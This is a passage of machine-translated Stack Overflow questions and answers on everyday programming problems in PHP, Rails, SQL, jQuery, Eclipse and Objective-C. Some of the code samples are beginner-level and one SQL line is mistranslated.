// keep calculations outside of the for loop if you can

// this will display all albums (count($albums) / 4) times.

$limit = count($albums) / 4;
for ($i = 0; $i < $limit; $i++) {
    echo '<tr>';

    foreach ($albums as $album) {
        echo '<td><a href="view_album.php?aid=' . 
            $album['id'] . '">' . $album['name'] . '</a> (' . 
            $album['image_count'] . ') image(s)<br />' . 
            $album['description'] . '...</td>';
    }
    echo "</tr>";
} 
```

您可能正在寻找的是

```
<?php
$counter = 0;

foreach($albums as $album) :
    // start new row 
    if ($counter == 0): ?>
        <tr>
    <?php endif; ?>
    <td><a href="view_album.php?aid=<?= $album['id'] ?>"><?= $album['name'] ?></a> (<?= $album['image_count'] ?>) image(s)<br />         
        <?= $album['description'] ?>...</td>
    <?php if ($counter++ == 3) : ?> <!-- 4 records printed in row; end row & reset counter -->
        </tr>
    <?php
        $counter = 0;
    endif;
endforeach;

$lastCount = $counter;
// print remaining empty cells
while ($counter ++ < 4) : ?>
    <td>&nbsp;</td>
endwhile;
// close row if necessary
if ($lastCount != 3) :
    </tr>
endif; 
```

# ruby-on-rails - 在 Rails 中重构编辑用户

> ID：11782283
> 
> 赞同：0
> 
> 时间：2012-08-02T16:57:58.580
> 
> 标签：ruby-on-rails, refactoring

我正在使用一个中型 Rails 应用程序，我在每个控制器中都这样做：

```
def create
  @object = Model.new(params[:model].merge(editing_user: current_user))
  ...
end

def update
  @object = Model.find(params[:id])
  @object.editing_user = current_user
  ...
end 
```

一遍又一遍地设置编辑用户不是 DRY。我考虑过用观察者清理它，但它需要访问当前用户。观察者无权访问当前用户，他们也不应该（德米特法则）。

有什么建议可以在控制器之间干燥吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:05:42.717

```
class ApplicationController < ActionController::Base
  before_filter :init_request

  def init_request
    params[:editing_user] = current_user
  end
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-02T17:10:19.293

你可以试试`after_filter`这个。也许是这样的：

```
class ApplicationController < ActionController::Base
  after_filter :set_editing_user

def set_editing_user
  @object.update_attribute(:editing_user, current_user) if @object && current_user
end 
```

当然，困难在于每次调用都要保存对象两次。一般来说，虽然创建和更新不会如此频繁地发生，以至于两次数据库提交是一个严重的问题，但如果您希望成为下一个 Twitter——具有大量数据库插入负载——这可能是一个问题。

您也可以将其设置在 a 中`before_filter`，但是您必须在 previous 中查找或设置该对象`before_filter`。否则`@object`将永远为零并且`before_filter`永远不会触发。您可以使用过滤器排序方法`prepend_before_filter`并`append_before_filter`确保这些过滤器的正确排序。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T17:07:55.687

我喜欢使用[decent_exposure](https://github.com/voxdolo/decent_exposure/)来干掉我的控制器。它会根据 :id 是否作为参数传递来自动查找或初始化模型实例，并从`params[:model]`.

要完成代码干涸，您可以使用新的策略支持（请参阅自述文件的末尾）自动设置`editing_user`模型的属性。

# xcode - Xcode更改不是发件人的按钮上的图像

> ID：11782284
> 
> 赞同：0
> 
> 时间：2012-08-02T16:57:59.590
> 
> 标签：xcode, uiimage, ibaction

我正在尝试更改不是发件人的按钮的图像，我试图将代码链接到按钮，但似乎不起作用我试图将 3 个按钮链接到 -(IBAction)Button1:(id)发件人；它仍然不起作用。

。H

```
-(IBAction)Button1:(id)sender;

-(IBAction)ButtonUn1:(id)sender;

-(IBAction)ButtonDef1:(id)sender; 
```

.m

```
-(IBAction)Button1:(id)sender

{
    UIImage *btnImage1 = [UIImage imageNamed:@"button_Not_At_all_R.png"];

    [sender setImage:btnImage1 forState:UIControlStateNormal];

    UIImage *btnImage2 = [UIImage imageNamed:@"Button_Unsure.png"];
    UIImage *btnImage3 = [UIImage imageNamed:@"Button_Definitely.png"];

    [ButtonUn1 setImage:btnImage2 forState:UIControlStateNormal];
    [ButoonDef1 setImage:btnImage3 forState:UIControlStateNormal];
} 
```

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T17:00:09.253

您需要为您的按钮创建一个 IBOutlet 并将其链接以直接访问它：

```
IBOutlet UIButton* buttonToChangePicture; 
```

IBAction 仅用于访问事件。

编辑：

另一种选择是使用 viewWithTag。

```
UIButton* button = (UIButton*)[myView viewWithTag:555] 
```

您需要首先为您的按钮设置一个唯一标签（在我的示例中为 555） 没有其他方法可以访问 IBAction 中的另一个按钮

# html - 推荐好的 html & css 编辑器？（Web应用程序）

> ID：11782288
> 
> 赞同：0
> 
> 时间：2012-08-02T16:58:09.400
> 
> 标签：html, css, ruby-on-rails, editor

Web 应用程序中是否有任何好的 html 和 css 编辑器？而且我不是指像dreamweaver 和eclipse 这样的人。我的意思是像stackoverflow在提问时使用的那些编辑器一样。我尝试在线查找 html 编辑器，但大多数编辑器不支持 css。有谁知道好的吗？最好用于 Ruby-on-Rails！:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:00:34.053

我只在一个地方使用它，但是[CKeditor](http://ckeditor.com/)已经相当不错了。它与我使用它的 RailsAdmin 集成得很好。寻找[ckeditor gem](https://github.com/galetahub/ckeditor/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-03T11:24:03.713

您可以使用[https://github.com/Nerian/bootstrap-wysihtml5-rails](https://github.com/Nerian/bootstrap-wysihtml5-rails)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-02T17:08:16.477

我真的很喜欢[TinyMCE](http://www.tinymce.com/)。它是 WordPress 附带的编辑器，但它可以自行安装。它是高度可配置的，支持 css，并且非常强大。

有两个版本，一个 javascript 版本和一个 jquery 版本，所以它可以与任何服务器技术一起安装，但是还有一个[用于 rails 的 TinyMCE gem](https://github.com/spohlenz/tinymce-rails)。

# sql-server - sql server DATEADD 与 DATEADD 中的 sql

> ID：11782290
> 
> 赞同：1
> 
> 时间：2012-08-02T16:58:19.187
> 
> 标签：sql-server, tsql

我需要执行以下操作：

```
 Select ProID from Pros ps where ps.ProId = '102-C01-1299'
    and  ConfirmDate > DATEADD(DAY, (select tt.DaysDue from tblTaskTimeline tt where Task   = 'TaskInfo') as days,ps.ProgStartDate) 
```

请注意对于 DATEADD 函数，我需要动态获取第二个参数。请注意 tt.DaysDue 返回一个整数值。

我收到一条消息说 DATEADD 需要 3 个参数。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:04:48.083

为什么不先创建一个参数？

```
declare @days int
set @days = (select tt.DaysDue from tblTaskTimeline tt where Task   = 'TaskInfo')

Select ProID 
from Pros ps 
where ps.ProId = '102-C01-1299'
    and  ConfirmDate > DATEADD(DAY, @days, ps.ProgStartDate) 
```

如果您不能使用参数，那么以下应该可以工作：

```
Select ProID 
from Pros ps 
where ps.ProId = '102-C01-1299'
    and  ConfirmDate > DATEADD(DAY, (select tt.DaysDue from tblTaskTimeline tt where Task = 'TaskInfo'), ps.ProgStartDate) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:05:20.977

删除“ as days”，它应该可以工作。

# mysql - 基于其他列的 SUM(DISTINCT)

> ID：11782292
> 
> 赞同：22
> 
> 时间：2012-08-02T16:58:20.897
> 
> 标签：mysql, math, sum, distinct

我目前有一个看起来像这样的表：

```
+------+-------+------------+------------+
| id   | rate  | first_name | last_name  |
+------+-------+------------+------------+ 
```

我需要做的是获取`SUM`rate 列的，但每个名称只有一次。例如，我有三行姓名 John Doe，每行的比率为 8。我需要`SUM`这些行中的 8 行，而不是 24，因此它为每组名称计算一次比率。

`SUM(DISTINCT last_name, first_name)`当然，这是行不通的，因为我试图对比率列求和，而不是对名称求和。我知道在计算单个记录时，我可以使用`COUNT(DISTINCT last_name, first_name)`，这就是我试图从中获得的行为类型`SUM`。

我怎样才能`SUM`为每个名称只获得一个费率？

提前致谢！

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-02T17:03:32.040

```
select sum (rate)
from yourTable
group by first_name, last_name 
```

**编辑**

如果你想得到那些小“ `sums`”的所有总和，你将得到所有表的总和..

```
Select sum(rate) from YourTable 
```

但是，如果由于某种原因有所不同（`where`例如，如果您使用 a ）并且您需要对上面的选择进行总和，那就去做。

```
select sum(SumGrouped) from 
(    select sum (rate) as 'SumGrouped'
    from yourTable
    group by first_name, last_name) T1 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-06-22T22:26:03.820

David said he found his answer as such:

```
SELECT SUM(rate) FROM (SELECT * FROM records GROUP BY last_name, first_name) T1 
```

But when you do the `GROUP BY` in the inner query, I think you have to use aggregate functions in your `SELECT`. So, I think the answer is more like:

```
SELECT SUM(rate) FROM (SELECT MAX(rate) AS rate FROM records GROUP BY last_name, first_name) T1 
```

I picked `MAX()` to pick only one "rate" for a "last_name, first_name" combination but `MIN()` should work the same, assuming that the "last_name, first_name" always leads us to the same "rate" even when it happens multiple times in the table. This seems to be David's original assumption - that for a unique name we want to grab the rate only once because we know it will be the same.

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2019-03-13T16:47:05.057

您可以通过使要求和的值不同来做到这一点。这是可能的，但非常**非常难看**。

首先，您可以通过哈希将字符串转换为数字。下面的 SQL 对名字和姓氏进行 MD5 哈希，返回 32 个十六进制数字。SUBSTRING 取其中的前 8 个，CONV 将其转换为 10 位数字（理论上这可能不是唯一的）：

```
CONV(SUBSTRING(MD5(CONCAT(first_name,last_name)), 1, 8), 16, 10) 
```

然后你将它除以一个非常大的数字并将其添加到费率中。你最终会得到一个像 8.0000019351087950 这样的费率。您必须使用 FORMAT 来避免 MySQL 截断小数位。这个比率现在对于每个名字和姓氏都是唯一的。

```
FORMAT(rate + CONV(SUBSTRING(MD5(CONCAT(first_name,last_name)), 1, 8), 16, 10)/1000000000000000, 16) 
```

然后，如果您对其进行 SUM DISTINCT ，它只会计算 8 一次。然后你需要对结果进行 FLOOR 以去除多余的小数位：

```
FLOOR(SUM(DISTINCT FORMAT(rate + CONV(SUBSTRING(MD5(CONCAT(first_name,last_name)), 1, 8), 16, 10)/1000000000000000, 16))) 
```

我在做一个更复杂的查询时发现了这种方法，该查询连接并分组了几个表。我仍然不确定我是否会使用它，因为它非常可怕，但它确实有效。对于回答问题的人来说，这也太迟了 6 年。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-08-02T17:12:30.410

```
SELECT SUM(rate)
FROM [TABLE] 
GROUP BY first_name, last_name; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-02T17:01:51.920

```
SELECT SUM(rate)
FROM [TABLE] 
GROUP BY CONCAT_WS(' ', first_name, last_name); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2022-01-21T17:26:26.040

最近，我遇到了一个类似的问题，但我已经有了一个用于不同目的的 GROUP BY 子句。这是一个例子：

```
SELECT r.name, SUM(r.rate), MIN(e.created_at)
FROM Rates r LEFT JOIN Events e ON r.id = e.rate_id
GROUP BY r.id 
```

这里的问题是，由于 JOIN with Event`SUM(r.rate)`将汇总具有多个事件的条目的重复项。在我的情况下，查询要复杂得多，所以我想避免有额外的子查询。幸运的是，有一个优雅的解决方案：

```
SELECT r.name, SUM(r.rate) / GREATEST(COUNT(DISTINCT e.event_id), 1), MIN(e.created_at)
FROM Rates r LEFT JOIN Events e ON r.id = e.rate_id
GROUP BY r.id 
```

`GREATEST`函数用于防止没有任何事件的条目被零除。如果您正在对整数求和，您可能还希望将总和转换为 INT

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-08-02T17:46:31.917

您可以使用上面提供的任何代码示例，因为没有任何聚合函数的 group by 子句将为每个分组条件返回一个不确定的记录。您可以参考[http://dev.mysql.com/doc/refman/5.5/en/group-by-hidden-columns.html](http://dev.mysql.com/doc/refman/5.5/en/group-by-hidden-columns.html)链接进行进一步阅读。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-04-30T07:12:18.103

我发现这个线程正在寻找一种更好的方法来解决我的问题，但我仍然没有找到更好的方法：

```
SELECT SUM(rate) FROM (SELECT DISTINCT rate, first_name, last_name) Q 
```

# ms-access-2007 - 访问 2007 图像捕获

> ID：11782293
> 
> 赞同：3
> 
> 时间：2012-08-02T16:58:21.083
> 
> 标签：ms-access-2007, image-capture

我一直试图弄清楚如何使用我的 Microsoft Access 2007 应用程序使用网络摄像头捕获图像。

过去我们一直在为此支付第三方应用程序的费用-它用于拍摄身份证照片，但是随着时间的流逝，该软件出现了错误，我认为我们应该可以自己完成！

我所需要的只是让我的 Access 应用程序使用网络摄像头捕获图像并将其保存在网络共享中。而已！

我一直在尝试寻找 vba 代码、twain 驱动程序、ActiveX 控件……但它们似乎都已被弃用（Access 97/2000）或专有！不过那里肯定有其他解决方案！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T23:19:34.810

您可以使用另一个应用程序（使用 vba Shell 函数）从网络摄像头拍摄快照并将其保存到文件中。我找到了一个例子：

[http://batchloaf.wordpress.com/2011/04/06/snapz-a-command-line-cam-image-grabber/](http://batchloaf.wordpress.com/2011/04/06/snapz-a-command-line-cam-image-grabber/)

祝你好运。

# eclipse - 迁移到新 Mac 后 Eclipse 未启动

> ID：11782299
> 
> 赞同：3
> 
> 时间：2012-08-02T16:58:44.300
> 
> 标签：eclipse, macos, migration

我刚刚使用 Migration Assistant 将我的东西移动到新的 mac，现在当我启动 Eclipse 时，我收到一个弹出窗口，告诉我查看：

```
~/.eclipse/org.eclipse.platform_3.7.0_564163029/configuration/1343925478439.log 
```

其中包含：

```
!SESSION 2012-08-02 12:37:58.263 -----------------------------------------------
eclipse.buildId=unknown
java.version=1.6.0_33
java.vendor=Apple Inc.
BootLoader constants: OS=macosx, ARCH=x86_64, WS=cocoa, NL=en_US
Framework arguments:  -product org.eclipse.epp.package.jee.product -keyring /Users/Me/.eclipse_keyring -showlocation
Command-line arguments:  -os macosx -ws cocoa -arch x86_64 -product org.eclipse.epp.package.jee.product -keyring /Users/Me/.eclipse_keyring -showlocation

!ENTRY org.eclipse.osgi 4 0 2012-08-02 12:37:58.630
!MESSAGE Application error
!STACK 1
java.lang.IllegalStateException: Unable to acquire application service. Ensure that the org.eclipse.core.runtime bundle is resolved and started (see config.ini).
        at org.eclipse.core.runtime.internal.adaptor.EclipseAppLauncher.start(EclipseAppLauncher.java:74)
        at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:344)
        at org.eclipse.core.runtime.adaptor.EclipseStarter.run(EclipseStarter.java:179)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:622)
        at org.eclipse.equinox.launcher.Main.basicRun(Main.java:577)
        at org.eclipse.equinox.launcher.Main.run(Main.java:1410) 
```

我发现[了这个问题](https://stackoverflow.com/questions/2493415/i-am-getting-a-following-error-while-launching-my-eclipse)：并尝试将以下内容添加到/Applications/eclipse-indigo/Eclipse.app/Contents/MacOS/eclipse.ini：

```
-Dosgi.bundles=org.eclipse.equinox.common@2:start,org.eclipse.update.configurator@3:start,org.eclipse.core.runtime@ 
```

但它仍然没有工作。我还尝试使用 -clean 选项从命令行运行 eclipse：

```
/Applications/eclipse-indigo/eclipse -clean 
```

还有其他想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-07T23:51:51.413

我遇到了同样的问题（eclipse helios），我将旧系统与新系统进行了比较，由于某种原因，/Application/eclipse/configuration 文件夹非常不同

新机器的配置文件夹中只有org.eclipse.osgi，而旧机器有org.eclipse.core.runtime、org.eclipse.core.simpleconfigurator、org.eclipse.core.source、org.eclipse.osgi ，org.eclipse.ui.intro.universal，org.eclipse.core.update。

我用旧的配置文件夹替换了新的配置文件夹并启动了它。但它仍然不一样......我注意到的几件事是eclipse市场以及我所有的maven构建都消失了。

最后，我刚刚将 Application/eclipse 文件夹从旧钻机复制到新钻机，它工作得很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T19:17:23.233

我不知道错误是什么，但由于安装 Eclipse 是一个简单的解压缩档案的问题，我从不尝试将 Eclipse 安装迁移到新机器上。我只是复制我的工作区，重新安装 Eclipse，然后运行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-29T23:47:28.650

转到旧的 mac 并在 /Applications 下找到 Eclipse 文件夹。然后将“配置”文件夹复制到新的 Mac 并替换同一路径下损坏的配置文件夹，也在 /Applications/eclipse 中。发生这种情况是因为 OS X 迁移助手错误地认为配置文件是与您的新计算机不兼容的应用程序。

# javascript - 如何缩短这个过长的 JavaScript 函数？

> ID：11782301
> 
> 赞同：1
> 
> 时间：2012-08-02T16:58:50.080
> 
> 标签：javascript

我有一个简单的脚本，它选择一个类并向其添加一个 selected 类，并将其从所有其他具有相似类的类中删除。这一切都很完美，但我知道必须有更好的方法来写出来，我就是想不通..它涉及到这样的事情吗？

```
$('.adv-option-set a, .adv-option-set2 a, .adv-option-set3 a, .adv-option-set4 a, .adv-option-set5 a, .adv-option-set6 a, .adv-option-set7 a').click(function()
{
    // if clicked item is selected then do nothing
    if ($(this).hasClass('selected')){}

    // otherwise deselect all and select just this one
    else
    {
        $('.adv-option-set a').removeClass('selected');
        $(this).addClass('selected');
    }

    {
        $('.adv-option-set2 a').removeClass('selected');
        $(this).addClass('selected');
    }

    {
        $('.adv-option-set3 a').removeClass('selected');
        $(this).addClass('selected');
    }
}); 
```

所以这是我目前拥有并且正在工作的代码：

```
$('.adv-option-set a').click(function()
{
    // if clicked item is selected then do nothing
    if ($(this).hasClass('selected')){}

    // otherwise deselect all and select just this one
    else
    {
        $('.adv-option-set a').removeClass('selected');
        $(this).addClass('selected');
    }
});

$('.adv-option-set2 a').click(function()
{
    // if clicked item is selected then do nothing
    if ($(this).hasClass('selected')){}

    // otherwise deselect all and select just this one
    else
    {
        $('.adv-option-set2 a').removeClass('selected');
        $(this).addClass('selected');
    }
});

$('.adv-option-set3 a').click(function()
{
    // if clicked item is selected then do nothing
    if ($(this).hasClass('selected')){}

    // otherwise deselect all and select just this one
    else
    {
        $('.adv-option-set3 a').removeClass('selected');
        $(this).addClass('selected');
    }
}); 
```

等等直到'.adv-option-set7 a'

编辑以显示 DOM：

```
 <article id="filter">
        <ul id="filter-nav" class="option-set">
          <li>Filter: </li>
          <li><a data-categories="*" data-subid="all" class="selected">All</a></li>
          <li><a data-categories="tubs-and-showers" data-subid="tubs-and-showers">Tubs &amp; Showers</a></li>
          <li><a data-categories="countertops" data-subid="countertops">Countertops</a></li>
          <li><a data-categories="faucets" data-subid="faucets"><s>Faucets</s></a></li>
          <li><a data-categories="cabinetry" data-subid="cabinetry"><s>Cabinetry</s></a></li>
          <li><a data-categories="flooring" data-subid="flooring"><s>Flooring</s></a></li>
          <li><a data-categories="toilets" data-subid="toilets"><s>Toilets</s></a></li>
          <li><a data-categories="accessories" data-subid="accessories"><s>Accessories</s></a></li>
        </ul>
        <div id="advfilter" class="advfilter filter-nav hidden">
          <ul id="tubs-and-showers" class="adv-option-set1">
            <li><span class="small">ADV</span> Filter: </li>
            <li><a data-categories="modular">Modular</a></li>
            <li><a data-categories="custom">Custom</a></li>
          </ul>
          <ul id="countertops" class="adv-option-set2">
            <li><span class="small">ADV</span> Filter: </li>
            <li><a data-categories="marble">Marble</a></li>
            <li><a data-categories="solid-surface">Solid Surface</a></li>
            <li><a data-categories="laminate"><s>Laminate</s></a></li>
            <li><a data-categories="granite"><s>Granite</s></a></li>
          </ul>
          <ul id="faucets" class="adv-option-set3">
            <li><span class="small">ADV</span> Filter: </li>
            <li><a data-categories="">Coming Soon</a></li>
            <li><a data-categories="">Coming Soon</a></li>
          </ul>
          <ul id="cabinetry" class="adv-option-set4">
            <li><span class="small">ADV</span> Filter: </li>
            <li><a data-categories="">Coming Soon</a></li>
            <li><a data-categories="">Coming Soon</a></li>
          </ul>
          <ul id="flooring" class="adv-option-set5">
            <li><span class="small">ADV</span> Filter: </li>
            <li><a data-categories="">Coming Soon</a></li>
            <li><a data-categories="">Coming Soon</a></li>
          </ul>
          <ul id="toilets" class="adv-option-set6">
            <li><span class="small">ADV</span> Filter: </li>
            <li><a data-categories="">Coming Soon</a></li>
            <li><a data-categories="">Coming Soon</a></li>
          </ul>
          <ul id="accessories" class="adv-option-set7">
            <li><span class="small">ADV</span> Filter: </li>
            <li><a data-categories="">Coming Soon</a></li>
            <li><a data-categories="">Coming Soon</a></li>
          </ul>
        </div>
      </article> 
```

最终编辑：这是我拥有的 JS 代码的另一部分，但您的答案似乎实际上也使这部分生效：

```
 $("#advfilter ul").hide();
    $('.option-set a').on('click', function() {
        $("#advfilter ul").hide();
        $("#advfilter").removeClass('hidden');
        $("#" + $(this).attr('data-subid')).show();
        /*location.href='#filter'*/
    });

    $('.option-set a').click(function()
    {
        // if clicked item is selected then deselect it
        if ($(this).hasClass('selected'))
        {
           $('.adv-option-set1 a').removeClass('selected');
           $('.adv-option-set2 a').removeClass('selected');
           $('.adv-option-set3 a').removeClass('selected');
           $('.adv-option-set4 a').removeClass('selected');
           $('.adv-option-set5 a').removeClass('selected');
           $('.adv-option-set6 a').removeClass('selected');
           $('.adv-option-set7 a').removeClass('selected');
        }

        // otherwise deselect all and select just this one
        else
        {
           $('.option-set a').removeClass('selected');
           $(this).addClass('selected');
           $('.adv-option-set1 a').removeClass('selected');
           $('.adv-option-set2 a').removeClass('selected');
           $('.adv-option-set3 a').removeClass('selected');
           $('.adv-option-set4 a').removeClass('selected');
           $('.adv-option-set5 a').removeClass('selected');
           $('.adv-option-set6 a').removeClass('selected');
           $('.adv-option-set7 a').removeClass('selected');
        }
    }); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:05:18.787

选项 #1 将是一个简单的循环：

```
for (var i=1; i<=7; i++) (function(){
    var links = $('.adv-option-set'+i+' a');
    links.click(function() {
        var $this = $(this);
        if (!$this.hasClass('selected')) { // could be left out
            links.removeClass('selected');
            $this.addClass('selected');
        }
    });
})(); 
```

请注意，此代码不会删除任何类，因为您对`.adv-option-set3`(" *...then deselect it* ") 的注释（不是代码）暗示，当项目已被选中时，它“*什么都不做”。*如果要启用删除类，您可能希望在处理程序中使用此代码段：

```
if ($(this).toggleClass('selected').hasClass('selected'))
    links.not(this).removeClass('selected'); 
```

选项 #2 是为所有链接设置相同的事件处理程序（更好：使用委托事件）并获取应动态删除类的同级链接。此代码取决于您的 DOM 设置。

* * *

好的，既然我看到了你的 dom，我还有一些额外的观点。

*   上课真的没用。您似乎使用 来标识一个元素 - 它已经由其唯一标识`id`。对它们都使用（相同的）来对`class="adv-option-set"`它们进行*分类*。

    选项 #2 的代码 - 既优雅又高效 - 将如下所示：

```
$("#advfilter").on("click", "a", function(e) {
    $(this).addClass('selected')
      .closest(".adv-option-set").find("a").not(this).removeClass('selected');
});
// or, little better but tightier bound to the DOM:
$("#advfilter").on("click", "a", function(e) {
    $(this).addClass('selected')
      .parent().siblings().find("a").removeClass('selected');
}); 
```

*   我不确定，但你真的应该看看传统的单选按钮来构建你的表单。完成后，您可以使用一些 JavaScript 对其进行增强。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-02T17:18:53.963

```
$('[class^=adv-option-set] a').click(
    function()
    {
       $(this).addClass('selected');
       $('[class^=adv-option-set] a').not(this).removeClass('selected');
    }
); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-02T17:12:55.810

是的。但首先，代码没有意义。您说“否则取消选择全部并仅选择这个”，但实际上您是在取消选择这个然后重新选择它。所以首先，给他们一个共同的类名。然后，使用 jQuery，您可以执行以下操作：

```
$(".commonClassName").each(function(index, item){
    item.click(function(){
        $(".commonClassName").removeClass('selected');  //no matter what, deselect all of them
        if(!item.hasClass('selected'))
        {
            item.addClass('selected');  //then select this one if it isn't already
        }
    }
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-02T17:09:54.437

您可以在 jQuery 中使用开头，如下所示：

```
$('div[class^="adv-option-set"] a').click(function()
{

   // if clicked item is selected then do nothing
   if ($(this).hasClass('selected'))
   {
   }else
   {
     $('div[class^="adv-option-set"] a').removeClass('selected');
     $(this).addClass('selected');
   }

} 
```

我希望这会有所帮助，这被称为属性以选择器开头，下面是参考链接供您查看： [http ://api.jquery.com/attribute-starts-with-selector/](http://api.jquery.com/attribute-starts-with-selector/)

这是我认为最短的代码，我在跳跃

谢谢 Ankur

# php - 通过 PHP 表更新 SQL 数据库时遇到问题

> ID：11782307
> 
> 赞同：0
> 
> 时间：2012-08-02T16:59:12.570
> 
> 标签：php, mysql, forms, html-table

尝试更新 MySQL 表但没有更新，我确定我只是没有看到这个小问题，希望得到一些帮助。谢谢

所以它是一个曲棍球池的交易区，如果你想让球员在交易区，那么你只需检查表格中的 CHECKBOX 并提交，它应该将数据库中的值更改为“1”。

形式：

```
echo "<table border='1'>";

echo "<tr><th>NAME</th> <th>POS</th> <th>BLOCK</th></tr>";

$counter = 1;

while($row = mysql_fetch_array( $result )) {

echo "<tr><td>"; 

echo "{$row['f_name']}" . " " . "{$row['l_name']}";

echo "</td><td><input name='pl_id[$counter]' type='hidden' value='{$row['pl_id']}'>";

echo "{$row['pos']}";

echo "</td><td><input name='pos[$counter]' type='hidden' value='{$row['pos']}'>";                                   

    echo "<input type='checkbox' name='block[$counter]' size='1' value='1'";

    if($row['block'] == '1')
    {
        echo "checked='checked'";
    }

    echo "></td></tr>";                 

$counter++;

} 
echo "</table>"; 
```

提交 PHP 页面：

```
mysql_connect("localhost", "user", "pass") or die(mysql_error());
mysql_select_db("mbbcom1_fantrax") or die(mysql_error());

$i = 1;
while ($i < 26) {

$block = $_POST['block'][$i];
$pl_id = $_POST['pl_id'][$i];

$query = mysql_query("UPDATE 'players'
                     SET  `block` = '$block' 
                     WHERE `players`.`pl_id` = '$pl_id'");                  
mysql_query($query); 

$i++; }

echo mysql_close(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-02T17:05:19.617

在 WHERE 之前删除逗号

mysql_query("更新 '玩家' SET `block`= '$block' WHERE `players`. `pl_id`= '$pl_id'");

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:06:20.643

你有一个 } 来减少，所以 PHP 代码不会运行。

你做了一个while循环和一个foreach循环，但你只是关闭了for循环。

当然你不需要一个 , 在`WHERE`声明之前

# c# - 如何在 C# 中创建 Visio 组件图像的可视列表

> ID：11782308
> 
> 赞同：0
> 
> 时间：2012-08-02T16:59:16.033
> 
> 标签：c#, wpf, visio

我正在尝试获取 Visio 组件列表并在 ListView、ListBox 或类似内容中显示形状。我目前有一个循环遍历“组件”的 foreach 循环。有什么建议么？

谢谢

# php - PHP转换多维数组以匹配另一个格式

> ID：11782309
> 
> 赞同：0
> 
> 时间：2012-08-02T16:59:20.793
> 
> 标签：php, arrays, codeigniter, multidimensional-array, explode

我有两个数组，一个是通过使用`explode()`逗号分隔的字符串生成的，另一个是`result_array()`在 Codeigniter 中生成的。

执行 print_r 时的结果是：

从爆炸（）：

```
Array
(
    [0] => keyword
    [1] => test
) 
```

从数据库：

```
Array
(
    [0] => Array
        (
            [name] => keyword
        )

    [1] => Array
        (
            [name] => test
        )
) 
```

我需要它们匹配，以便我可以使用`array_diff()`，让它们匹配的最佳方法是什么？除了 CI之外，还有什么东西`result_array()`可以得到兼容的数组吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T17:02:27.110

您可以像这样创建一个新数组：

```
foreach($fromDatabase as $x)
{
  $arr[] = $x['name'];
} 
```

现在，您将拥有两个一暗的数组，您可以运行 array_dif。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-02T17:02:14.890

```
$new_array = array();
foreach ($array1 as $line) {
   $new_array[] = array('name' => $line);
}
print_r($new_array); 
```

那应该对你有用。

# objective-c - 如何计算 Objective-C 中两个日期之间的差异？

> ID：11782313
> 
> 赞同：0
> 
> 时间：2012-08-02T16:59:32.207
> 
> 标签：objective-c, date, nsdate

我正在通过 Objective-C 编程中的一个挑战，The Big Nerd Ranch Guide，我对其中一个挑战感到有些困惑。

> 使用 NSDate 的两个实例来计算你已经活了多少秒。提示：这是您如何根据年、月等创建新日期对象的方法：

所以我需要以秒为单位计算现在和我的出生日期之间的差异。听起来不错。然后提示出现：

```
@autoreleasepool {
    NSDateComponents *comps = [[NSDateComponents alloc] init];
    [comps setYear:1981];
    [comps setMonth:7];
    [comps setDay:12];
    [comps setHour:1];
    [comps setMinute:55];
    [comps setSecond:33];

    NSCalendar *g = [[NSCalendar alloc] initWithCalendarIdentifier:NSGregorianCalendar];

    NSDate *dateOfBirth = [g dateFromComponents:comps]; 
```

第一个问题是我不明白这`*g`是什么意思。我知道它是一个指向 NSCalendar 对象的指针。但我们为什么需要它？代表什么`g`？

然后示例代码使用该`g`变量来获取日期。在另一种语言中，这就像`DateDiff(dateOne, dateTwo, interval)`. 我不清楚为什么首先需要 Calendar 对象，以及为什么我们必须创建日期组件来提供对象。

这对我来说是全新的，我过去曾使用过动态语言。所以像“傻瓜”这样的解释会很棒！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-02T17:03:50.430

> 然后示例代码使用 g 变量来获取日期。在另一种语言中，这就像 DateDiff(dateOne, dateTwo, interval) 一样简单。我不清楚为什么首先需要 Calendar 对象，以及为什么我们必须创建日期组件来提供对象。

我不是 Objective-C 程序员，但我对日期/时间 API 有所了解。

